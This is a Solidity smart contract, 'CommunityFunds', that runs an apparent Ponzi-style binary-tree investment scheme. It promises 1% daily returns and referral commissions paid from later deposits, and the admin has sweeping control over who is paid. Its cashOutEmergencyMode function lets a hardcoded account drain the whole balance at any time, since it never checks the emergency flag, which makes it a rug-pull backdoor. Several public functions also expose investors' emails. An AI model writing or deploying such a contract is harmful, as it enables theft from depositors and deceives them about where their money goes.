pragma solidity ^0.4.25;

// 11/19/2018

contract CommunityFunds {
    event MaxOut (address investor, uint256 times, uint256 at);
    
    uint256 public constant ONE_DAY = 86400;
    address private admin;
    uint256 private depositedAmountGross = 0;
    uint256 private paySystemCommissionTimes = 1;
    uint256 private payDailyIncomeTimes = 1;
    uint256 private lastPaySystemCommission = now;
    uint256 private lastPayDailyIncome = now;
    uint256 private contractStartAt = now;
    uint256 private lastReset = now;
   
    address private operationFund = 0xe707EF0F76172eb2ed2541Af344acb2dB092406a;
    address private developmentFund = 0x319bC822Fb406444f9756929DdC294B649A01b2E;
    address private reserveFund = 0xa04DE4366F6d06b84a402Ed0310360E1d554d8Fc;
    address private emergencyAccount = 0x6DeC2927cC604D1bE364C1DaBDE8f8597D5f4387;
    bool private emergencyMode = false;
    mapping (address => Investor) investors;
    address[] public investorAddresses;
    mapping (bytes32 => Investment) investments;
    mapping (bytes32 => Withdrawal) withdrawals;
    bytes32[] private investmentIds;
    bytes32[] private withdrawalIds;
    uint256 maxLevelsAddSale = 200;
    
    uint256 maximumMaxOutInWeek = 4;
    
    struct Investment {
        bytes32 id;
        uint256 at;
        uint256 amount;
        address investor;
    }

    struct Withdrawal {
        bytes32 id;
        uint256 at;
        uint256 amount;
        address investor;
        address presentee;
        uint256 reason;
        uint256 times;
    }

 

    struct Investor {
        string email;
        address parent;
        address leftChild;
        address rightChild;
        address presenter;
        uint256 generation;
        address[] presentees;
        uint256 depositedAmount;
        uint256 withdrewAmount;
        bool isDisabled;
        uint256 lastMaxOut;
        uint256 maxOutTimes;
        uint256 maxOutTimesInWeek;
        uint256 totalSell;
        uint256 sellThisMonth;
        bytes32[] investments;
        bytes32[] withdrawals;
        uint256 rightSell;
        uint256 leftSell;
        uint256 reserveCommission;
        uint256 dailyIncomeWithrewAmount;
    }

    constructor () public { admin = msg.sender; }
    
    modifier mustBeAdmin() { require(msg.sender == admin); _; }    
    
    function () payable public { deposit(); }
    

    function deposit() payable public {
        require(msg.value >= 1 ether);
        Investor storage investor = investors[msg.sender];
        require(investor.generation != 0);
        require(investor.maxOutTimesInWeek < maximumMaxOutInWeek);
     
        require(investor.maxOutTimes == 0 || now - investor.lastMaxOut < ONE_DAY * 7 || investor.depositedAmount != 0);
        depositedAmountGross += msg.value;
        bytes32 id = keccak256(abi.encodePacked(block.number, now, msg.sender, msg.value));
        uint256 investmentValue = investor.depositedAmount + msg.value <= 20 ether ? msg.value : 20 ether - investor.depositedAmount;
        if (investmentValue == 0) return;
        Investment memory investment = Investment({ id: id, at: now, amount: investmentValue, investor: msg.sender });
        investments[id] = investment;
        processInvestments(id);
        investmentIds.push(id);
    }
    
    function processInvestments(bytes32 investmentId) internal {
        Investment storage investment = investments[investmentId];
        uint256 amount = investment.amount;
        Investor storage investor = investors[investment.investor];
        investor.investments.push(investmentId);
        investor.depositedAmount += amount;
        
        addSellForParents(investment.investor, amount);
        address presenterAddress = investor.presenter;
        Investor storage presenter = investors[presenterAddress];
        if (presenterAddress != 0) {
            presenter.totalSell += amount;
            presenter.sellThisMonth += amount;
        }
        if (presenter.depositedAmount >= 1 ether && !presenter.isDisabled) {
            sendEtherForInvestor(presenterAddress, amount / 10, 1, investment.investor, 0);
        }
    }

    function addSellForParents(address investorAddress, uint256 amount) internal {
        Investor memory investor = investors[investorAddress];
        address currentParentAddress = investor.parent;
        address currentInvestorAddress = investorAddress;
        uint256 loopCount = investor.generation - 1;
        uint256 loop = loopCount < maxLevelsAddSale ? loopCount : maxLevelsAddSale;
        for(uint256 i = 0; i < loop; i++) {
            Investor storage parent = investors[currentParentAddress];
            if (parent.leftChild == currentInvestorAddress) parent.leftSell += amount;
            else parent.rightSell += amount;
            uint256 incomeTilNow = getAllIncomeTilNow(currentParentAddress);
            if (incomeTilNow > 3 * parent.depositedAmount) {
                payDailyIncomeForInvestor(currentParentAddress, 0);
                paySystemCommissionInvestor(currentParentAddress, 0);
            }
            currentInvestorAddress = currentParentAddress;
            currentParentAddress = parent.parent;
        }
    }
    
    function setMaxLevelsAddSale(uint256 level) public  mustBeAdmin {
        require(level > 0);
        maxLevelsAddSale = level;
    }

    function sendEtherForInvestor(address investorAddress, uint256 value, uint256 reason, address presentee, uint256 times) internal {
        if (value == 0 || investorAddress == 0) return;
        Investor storage investor = investors[investorAddress];
        if (investor.reserveCommission > 0) {
            bool isPass = investor.reserveCommission >= 3 * investor.depositedAmount;
            uint256 reserveCommission = isPass ? investor.reserveCommission + value : investor.reserveCommission;
            investor.reserveCommission = 0;
            sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
            if (isPass) return;
        }
        uint256 withdrewAmount = investor.withdrewAmount;
        uint256 depositedAmount = investor.depositedAmount;
        uint256 amountToPay = value;
        if (withdrewAmount + value >= 3 * depositedAmount) {
            amountToPay = 3 * depositedAmount - withdrewAmount;
            investor.reserveCommission = value - amountToPay;
            if (reason != 2) investor.reserveCommission += getDailyIncomeForUser(investorAddress);
            if (reason != 3) investor.reserveCommission += getUnpaidSystemCommission(investorAddress);
            investor.maxOutTimes++;
            investor.maxOutTimesInWeek++;
            investor.depositedAmount = 0;
            investor.withdrewAmount = 0;
            investor.lastMaxOut = now;
            investor.dailyIncomeWithrewAmount = 0;
            emit MaxOut(investorAddress, investor.maxOutTimes, now);
        } else {
            investors[investorAddress].withdrewAmount += amountToPay;
        }
        if (amountToPay != 0) {
            investorAddress.transfer(amountToPay / 100 * 90);
            operationFund.transfer(amountToPay / 100 * 5);
            developmentFund.transfer(amountToPay / 100 * 1);
          
            bytes32 id = keccak256(abi.encodePacked(block.difficulty, now, investorAddress, amountToPay, reason));
            Withdrawal memory withdrawal = Withdrawal({ id: id, at: now, amount: amountToPay, investor: investorAddress, presentee: presentee, times: times, reason: reason });
            withdrawals[id] = withdrawal;
            investor.withdrawals.push(id);
            withdrawalIds.push(id);
        }
    }


    function getAllIncomeTilNow(address investorAddress) internal view returns(uint256 allIncome) {
        Investor memory investor = investors[investorAddress];
        uint256 unpaidDailyIncome = getDailyIncomeForUser(investorAddress);
        uint256 withdrewAmount = investor.withdrewAmount;
        uint256 unpaidSystemCommission = getUnpaidSystemCommission(investorAddress);
        uint256 allIncomeNow = unpaidDailyIncome + withdrewAmount + unpaidSystemCommission;
        return allIncomeNow;
    }



    function getContractInfo() public view returns (address _admin, uint256 _depositedAmountGross, address _developmentFund, address _operationFund, address _reserveFund, address _emergencyAccount, bool _emergencyMode, address[] _investorAddresses, uint256 balance, uint256 _paySystemCommissionTimes, uint256 _maximumMaxOutInWeek) {
        return (admin, depositedAmountGross, developmentFund, operationFund, reserveFund, emergencyAccount, emergencyMode, investorAddresses, address(this).balance, paySystemCommissionTimes, maximumMaxOutInWeek);
    }
    
    function getContractTime() public view returns(uint256 _contractStartAt, uint256 _lastReset, uint256 _oneDay, uint256 _lastPayDailyIncome, uint256 _lastPaySystemCommission) {
        return (contractStartAt, lastReset, ONE_DAY, lastPayDailyIncome, lastPaySystemCommission);
    }
    
    function getInvestorRegularInfo(address investorAddress) public view returns (string email, uint256 generation, uint256 rightSell, uint256 leftSell, uint256 reserveCommission, uint256 depositedAmount, uint256 withdrewAmount, bool isDisabled) {
        Investor memory investor = investors[investorAddress];
        return (
            investor.email,
            investor.generation,
            investor.rightSell,
            investor.leftSell,
            investor.reserveCommission,
            investor.depositedAmount,
            investor.withdrewAmount,
            investor.isDisabled
        );
    }
    
    function getInvestorAccountInfo(address investorAddress) public view returns (uint256 maxOutTimes, uint256 maxOutTimesInWeek, uint256 totalSell, bytes32[] investorIds, uint256 dailyIncomeWithrewAmount, uint256 unpaidSystemCommission, uint256 unpaidDailyIncome) {
        Investor memory investor = investors[investorAddress];
        return (
            investor.maxOutTimes,
            investor.maxOutTimesInWeek,
            investor.totalSell,
            investor.investments,
            investor.dailyIncomeWithrewAmount,
            getUnpaidSystemCommission(investorAddress),
            getDailyIncomeForUser(investorAddress)
        ); 
    }
    
    function getInvestorTreeInfo(address investorAddress) public view returns (address leftChild, address rightChild, address parent, address presenter, uint256 sellThisMonth, uint256 lastMaxOut) {
        Investor memory investor = investors[investorAddress];
        return (
            investor.leftChild,
            investor.rightChild,
            investor.parent,
            investor.presenter,
            investor.sellThisMonth,
            investor.lastMaxOut
        );
    }
    
    function getWithdrawalsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, address[] presentees, uint256[] reasons, uint256[] times, bytes32[] emails) {
        ids = new bytes32[](withdrawalIds.length);
        ats = new uint256[](withdrawalIds.length);
        amounts = new uint256[](withdrawalIds.length);
        emails = new bytes32[](withdrawalIds.length);
        presentees = new address[](withdrawalIds.length);
        reasons = new uint256[](withdrawalIds.length);
        times = new uint256[](withdrawalIds.length);
        uint256 index = 0;
        for (uint256 i = 0; i < withdrawalIds.length; i++) {
            bytes32 id = withdrawalIds[i];
            if (withdrawals[id].at < start || withdrawals[id].at > end) continue;
            if (investorAddress != 0 && withdrawals[id].investor != investorAddress) continue;
            ids[index] = id; 
            ats[index] = withdrawals[id].at;
            amounts[index] = withdrawals[id].amount;
            emails[index] = stringToBytes32(investors[withdrawals[id].investor].email);
            reasons[index] = withdrawals[id].reason;
            times[index] = withdrawals[id].times;
            presentees[index] = withdrawals[id].presentee;
            index++;
        }
        return (ids, ats, amounts, presentees, reasons, times, emails);
    }
    
    function getInvestmentsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, bytes32[] emails) {
        ids = new bytes32[](investmentIds.length);
        ats = new uint256[](investmentIds.length);
        amounts = new uint256[](investmentIds.length);
        emails = new bytes32[](investmentIds.length);
        uint256 index = 0;
        for (uint256 i = 0; i < investmentIds.length; i++) {
            bytes32 id = investmentIds[i];
            if (investorAddress != 0 && investments[id].investor != investorAddress) continue;
            if (investments[id].at < start || investments[id].at > end) continue;
            ids[index] = id;
            ats[index] = investments[id].at;
            amounts[index] = investments[id].amount;
            emails[index] = stringToBytes32(investors[investments[id].investor].email);
            index++;
        }
        return (ids, ats, amounts, emails);
    }

    function getNodesAddresses(address rootNodeAddress) internal view returns(address[]){
        uint256 maxLength = investorAddresses.length;
        address[] memory nodes = new address[](maxLength);
        nodes[0] = rootNodeAddress;
        uint256 processIndex = 0;
        uint256 nextIndex = 1;
        while (processIndex != nextIndex) {
            Investor memory currentInvestor = investors[nodes[processIndex++]];
            if (currentInvestor.leftChild != 0) nodes[nextIndex++] = currentInvestor.leftChild;
            if (currentInvestor.rightChild != 0) nodes[nextIndex++] = currentInvestor.rightChild;
        }
        return nodes;
    }

    function stringToBytes32(string source) internal pure returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) return 0x0;
        assembly { result := mload(add(source, 32)) }
    }

    function getInvestorTree(address rootInvestor) public view returns(address[] nodeInvestors, bytes32[] emails, uint256[] leftSells, uint256[] rightSells, address[] parents, uint256[] generations, uint256[] deposits){
        nodeInvestors = getNodesAddresses(rootInvestor);
        uint256 length = nodeInvestors.length;
        leftSells = new uint256[](length);
        rightSells = new uint256[](length);
        emails = new bytes32[] (length);
        parents = new address[] (length);
        generations = new uint256[] (length);
        deposits = new uint256[] (length);
        for (uint256 i = 0; i < length; i++) {
            Investor memory investor = investors[nodeInvestors[i]];
            parents[i] = investor.parent;
            string memory email = investor.email;
            emails[i] = stringToBytes32(email);
            leftSells[i] = investor.leftSell;
            rightSells[i] = investor.rightSell;
            generations[i] = investor.generation;
            deposits[i] = investor.depositedAmount;
        }
        return (nodeInvestors, emails, leftSells, rightSells, parents, generations, deposits);
    }

    function getListInvestor() public view returns (address[] nodeInvestors, bytes32[] emails, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, bool[] isDisableds) {
        uint256 length = investorAddresses.length;
        unpaidSystemCommissions = new uint256[](length);
        unpaidDailyIncomes = new uint256[](length);
        emails = new bytes32[] (length);
        depositedAmounts = new uint256[] (length);
        unpaidSystemCommissions = new uint256[] (length);
        isDisableds = new bool[] (length);
        unpaidDailyIncomes = new uint256[] (length); 
        withdrewAmounts = new uint256[](length);
        for (uint256 i = 0; i < length; i++) {
            Investor memory investor = investors[investorAddresses[i]];
            depositedAmounts[i] = investor.depositedAmount;
            string memory email = investor.email;
            emails[i] = stringToBytes32(email);
            withdrewAmounts[i] = investor.withdrewAmount;
            isDisableds[i] = investor.isDisabled;
            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
        }
        return (investorAddresses, emails, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, isDisableds);
    }
    
   

    function putPresentee(address presenterAddress, address presenteeAddress, address parentAddress, string presenteeEmail, bool isLeft) public mustBeAdmin {
        Investor storage presenter = investors[presenterAddress];
        Investor storage parent = investors[parentAddress];
        if (investorAddresses.length != 0) {
            require(presenter.generation != 0);
            require(parent.generation != 0);
            if (isLeft) {
                require(parent.leftChild == 0); 
            } else {
                require(parent.rightChild == 0); 
            }
        }
        
        if (presenter.generation != 0) presenter.presentees.push(presenteeAddress);
        Investor memory investor = Investor({
            email: presenteeEmail,
            parent: parentAddress,
            leftChild: 0,
            rightChild: 0,
            presenter: presenterAddress,
            generation: parent.generation + 1,
            presentees: new address[](0),
            depositedAmount: 0,
            withdrewAmount: 0,
            isDisabled: false,
            lastMaxOut: now,
            maxOutTimes: 0,
            maxOutTimesInWeek: 0,
            totalSell: 0,
            sellThisMonth: 0,
            investments: new bytes32[](0),
            withdrawals: new bytes32[](0),
            rightSell: 0,
            leftSell: 0,
            reserveCommission: 0,
            dailyIncomeWithrewAmount: 0
        });
        investors[presenteeAddress] = investor;
       
        investorAddresses.push(presenteeAddress);
        if (parent.generation == 0) return;
        if (isLeft) {
            parent.leftChild = presenteeAddress;
        } else {
            parent.rightChild = presenteeAddress;
        }
    }

  

    function getDailyIncomeForUser(address investorAddress) internal view returns(uint256 amount) {
        Investor memory investor = investors[investorAddress];
        uint256 investmentLength = investor.investments.length;
        uint256 dailyIncome = 0;
        for (uint256 i = 0; i < investmentLength; i++) {
            Investment memory investment = investments[investor.investments[i]];
            if (investment.at < investor.lastMaxOut) continue; 
            if (now - investment.at >= ONE_DAY) {
                uint256 numberOfDay = (now - investment.at) / ONE_DAY;
                uint256 totalDailyIncome = numberOfDay * investment.amount / 100;
                dailyIncome = totalDailyIncome + dailyIncome;
            }
        }
        return dailyIncome - investor.dailyIncomeWithrewAmount;
    }
    
    function payDailyIncomeForInvestor(address investorAddress, uint256 times) public mustBeAdmin {
        uint256 dailyIncome = getDailyIncomeForUser(investorAddress);
        if (investors[investorAddress].isDisabled) return;
        investors[investorAddress].dailyIncomeWithrewAmount += dailyIncome;
        sendEtherForInvestor(investorAddress, dailyIncome, 2, 0, times);
    }
    
    function payDailyIncomeByIndex(uint256 from, uint256 to) public mustBeAdmin{
        require(from >= 0 && to < investorAddresses.length);
        for(uint256 i = from; i <= to; i++) {
            payDailyIncomeForInvestor(investorAddresses[i], payDailyIncomeTimes);
        }
    }
    
  
    function getTotalSellLevel(uint256 totalSell) internal pure returns (uint256 level){
        if (totalSell < 30 ether) return 0;
        if (totalSell < 60 ether) return 1;
        if (totalSell < 90 ether) return 2;
        if (totalSell < 120 ether) return 3;
        if (totalSell < 150 ether) return 4;
        return 5;
    }
    
    function getSellThisMonthLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
        if (sellThisMonth < 2 ether) return 0;
        if (sellThisMonth < 4 ether) return 1;
        if (sellThisMonth < 6 ether) return 2;
        if (sellThisMonth < 8 ether) return 3;
        if (sellThisMonth < 10 ether) return 4;
        return 5;
    }
    
    function getDepositLevel(uint256 sellThisMonth) internal pure returns (uint256 level){
        if (sellThisMonth < 2 ether) return 0;
        if (sellThisMonth < 4 ether) return 1;
        if (sellThisMonth < 6 ether) return 2;
        if (sellThisMonth < 8 ether) return 3;
        if (sellThisMonth < 10 ether) return 4;
        return 5;
    }
    
    function getPercentage(uint256 depositedAmount, uint256 totalSell, uint256 sellThisMonth) internal pure returns(uint256 level) {
        uint256 totalSellLevel = getTotalSellLevel(totalSell);
        uint256 depLevel = getDepositLevel(depositedAmount);
        uint256 sellThisMonthLevel = getSellThisMonthLevel(sellThisMonth);
        uint256 min12 = totalSellLevel < depLevel ? totalSellLevel : depLevel;
        uint256 minLevel = sellThisMonthLevel < min12 ? sellThisMonthLevel : min12;
        return minLevel * 2;
    }

    function getUnpaidSystemCommission(address investorAddress) public view returns(uint256 unpaid) {
        Investor memory investor = investors[investorAddress];
        uint256 depositedAmount = investor.depositedAmount;
        uint256 totalSell = investor.totalSell;
        uint256 leftSell = investor.leftSell;
        uint256 rightSell = investor.rightSell;
        uint256 sellThisMonth = investor.sellThisMonth;
        uint256 sellToPaySystemCommission = rightSell < leftSell ? rightSell : leftSell;
        uint256 commission = sellToPaySystemCommission * getPercentage(depositedAmount, totalSell, sellThisMonth) / 100;
        return commission;
    }
    
    function paySystemCommissionInvestor(address investorAddress, uint256 times) public mustBeAdmin {
        Investor storage investor = investors[investorAddress];
        if (investor.isDisabled) return;
        uint256 systemCommission = getUnpaidSystemCommission(investorAddress);
        if (paySystemCommissionTimes > 3 && times != 0) {
            investor.rightSell = 0;
            investor.leftSell = 0;
        } else if (investor.rightSell >= investor.leftSell) {
            investor.rightSell = investor.rightSell - investor.leftSell;
            investor.leftSell = 0;
        } else {
            investor.leftSell = investor.leftSell - investor.rightSell;
            investor.rightSell = 0;
        }
        if (times != 0) investor.sellThisMonth = 0;
        sendEtherForInvestor(investorAddress, systemCommission, 3, 0, times);
    }

    function paySystemCommissionByIndex(uint256 from, uint256 to) public mustBeAdmin {
         require(from >= 0 && to < investorAddresses.length);
        // change 1 to 30
        if (now <= 30 * ONE_DAY + contractStartAt) return;
        for(uint256 i = from; i <= to; i++) {
            paySystemCommissionInvestor(investorAddresses[i], paySystemCommissionTimes);
        }
     }


    function finishPayDailyIncome() public mustBeAdmin {
        lastPayDailyIncome = now;
        payDailyIncomeTimes++;
    }
    
    function finishPaySystemCommission() public mustBeAdmin {
        lastPaySystemCommission = now;
        paySystemCommissionTimes++;
    }


    function turnOnEmergencyMode() public mustBeAdmin { emergencyMode = true; }

    function cashOutEmergencyMode() public {
        require(msg.sender == emergencyAccount);
        msg.sender.transfer(address(this).balance);
    }
    
 
    
    function resetGame(address[] yesInvestors, address[] noInvestors) public mustBeAdmin {
        lastReset = now;
        uint256 yesInvestorsLength = yesInvestors.length;
        for (uint256 i = 0; i < yesInvestorsLength; i++) {
            address yesInvestorAddress = yesInvestors[i];
            Investor storage yesInvestor = investors[yesInvestorAddress];
            if (yesInvestor.maxOutTimes > 0 || (yesInvestor.withdrewAmount >= yesInvestor.depositedAmount && yesInvestor.withdrewAmount != 0)) {
                yesInvestor.lastMaxOut = now;
                yesInvestor.depositedAmount = 0;
                yesInvestor.withdrewAmount = 0;
                yesInvestor.dailyIncomeWithrewAmount = 0;
            }
            yesInvestor.reserveCommission = 0;
            yesInvestor.rightSell = 0;
            yesInvestor.leftSell = 0;
            yesInvestor.totalSell = 0;
            yesInvestor.sellThisMonth = 0;
        }
        uint256 noInvestorsLength = noInvestors.length;
        for (uint256 j = 0; j < noInvestorsLength; j++) {
            address noInvestorAddress = noInvestors[j];
            Investor storage noInvestor = investors[noInvestorAddress];
            if (noInvestor.maxOutTimes > 0 || (noInvestor.withdrewAmount >= noInvestor.depositedAmount && noInvestor.withdrewAmount != 0)) {
                noInvestor.isDisabled = true;
                noInvestor.reserveCommission = 0;
                noInvestor.lastMaxOut = now;
                noInvestor.depositedAmount = 0;
                noInvestor.withdrewAmount = 0;
                noInvestor.dailyIncomeWithrewAmount = 0;
            }
            noInvestor.reserveCommission = 0;
            noInvestor.rightSell = 0;
            noInvestor.leftSell = 0;
            noInvestor.totalSell = 0;
            noInvestor.sellThisMonth = 0;
        }
    }

    function stopGame(uint256 percent, uint256 from, uint256 to) mustBeAdmin public {
        require(percent <= 50);
        require(from >= 0 && to < investorAddresses.length);
        for (uint256 i = from; i <= to; i++) {
            address investorAddress = investorAddresses[i];
            Investor storage investor = investors[investorAddress];
            if (investor.maxOutTimes > 0) continue;
            if (investor.isDisabled) continue;
            uint256 depositedAmount = investor.depositedAmount;
            uint256 withdrewAmount = investor.withdrewAmount;
            if (withdrewAmount >= depositedAmount / 2) continue;
            sendEtherForInvestor(investorAddress, depositedAmount * percent / 100 - withdrewAmount, 6, 0, 0);
        }
    }
    
    function revivalInvestor(address investor) public mustBeAdmin { investors[investor].lastMaxOut = now; }

    function getSystemCommision(address user, uint256 totalSell, uint256 sellThisMonth, uint256 rightSell, uint256 leftSell) public mustBeAdmin {
        Investor storage investor = investors[user];
        require(investor.generation > 0);
        investor.totalSell = totalSell;
        investor.sellThisMonth = sellThisMonth;
        investor.rightSell = rightSell;
        investor.leftSell = leftSell;
    }

    function getPercentToMaxOut(address investorAddress) public view returns(uint256) {
        uint256 depositedAmount = investors[investorAddress].depositedAmount;
        if (depositedAmount == 0) return 0;
        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
        uint256 percent = 100 * (unpaidSystemCommissions + unpaidDailyIncomes + withdrewAmount) / depositedAmount;
        return percent;
    }

    function payToReachMaxOut(address investorAddress) public mustBeAdmin{
        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);
        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);
        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;
        uint256 depositedAmount = investors[investorAddress].depositedAmount;
        uint256 reserveCommission = investors[investorAddress].reserveCommission;
        require(depositedAmount > 0  && withdrewAmount + unpaidSystemCommissions + unpaidDailyIncomes + reserveCommission >= 3 * depositedAmount);
        investors[investorAddress].reserveCommission = 0;
        sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);
        payDailyIncomeForInvestor(investorAddress, 0);
        paySystemCommissionInvestor(investorAddress, 0);
    }

    function getMaxOutUser() public view returns (address[] nodeInvestors, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, uint256[] reserveCommissions, bool[] isDisableds) {
        uint256 length = investorAddresses.length;
        unpaidSystemCommissions = new uint256[](length);
        unpaidDailyIncomes = new uint256[](length);
        depositedAmounts = new uint256[] (length);
        unpaidSystemCommissions = new uint256[] (length);
        reserveCommissions = new uint256[] (length);
        unpaidDailyIncomes = new uint256[] (length); 
        withdrewAmounts = new uint256[](length);
        isDisableds = new bool[](length);
        for (uint256 i = 0; i < length; i++) {
            Investor memory investor = investors[investorAddresses[i]];
            depositedAmounts[i] = investor.depositedAmount;
            withdrewAmounts[i] = investor.withdrewAmount;
            reserveCommissions[i] = investor.reserveCommission;
            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);
            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);
            isDisableds[i] = investor.isDisabled;
        }
        return (investorAddresses, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, reserveCommissions, isDisableds);
    }

    function getLazyInvestor() public view returns (bytes32[] emails, address[] addresses, uint256[] lastDeposits, uint256[] depositedAmounts, uint256[] sellThisMonths, uint256[] totalSells, uint256[] maxOuts) {
        uint256 length = investorAddresses.length;
        emails = new bytes32[] (length);
        lastDeposits = new uint256[] (length);
        addresses = new address[](length);
        depositedAmounts = new uint256[] (length);
        sellThisMonths = new uint256[] (length);
        totalSells = new uint256[](length);
        maxOuts = new uint256[](length);
        uint256 index = 0;
        for (uint256 i = 0; i < length; i++) {
            Investor memory investor = investors[investorAddresses[i]];
            if (investor.withdrewAmount > investor.depositedAmount) continue;
            lastDeposits[index] = investor.investments.length != 0 ? investments[investor.investments[investor.investments.length - 1]].at : 0;
            emails[index] = stringToBytes32(investor.email);
            addresses[index] = investorAddresses[i];
            depositedAmounts[index] = investor.depositedAmount;
            sellThisMonths[index] = investor.sellThisMonth;
            totalSells[index] = investor.totalSell;
            maxOuts[index] = investor.maxOutTimes;
            index++;
        }
        return (emails, addresses, lastDeposits, depositedAmounts, sellThisMonths, totalSells, maxOuts);
    }
  
    function resetMaxOutInWeek() public mustBeAdmin {
        uint256 length = investorAddresses.length;
        for (uint256 i = 0; i < length; i++) {
            address investorAddress = investorAddresses[i];
            investors[investorAddress].maxOutTimesInWeek = 0;
        }
    }
    
    function setMaximumMaxOutInWeek(uint256 maximum) public mustBeAdmin{ maximumMaxOutInWeek = maximum; }

    function disableInvestor(address investorAddress) public mustBeAdmin {
        Investor storage investor = investors[investorAddress];
        investor.isDisabled = true;
    }
    
    function enableInvestor(address investorAddress) public mustBeAdmin {
        Investor storage investor = investors[investorAddress];
        investor.isDisabled = false;
    }
    
    function donate() payable public { depositedAmountGross += msg.value; }
}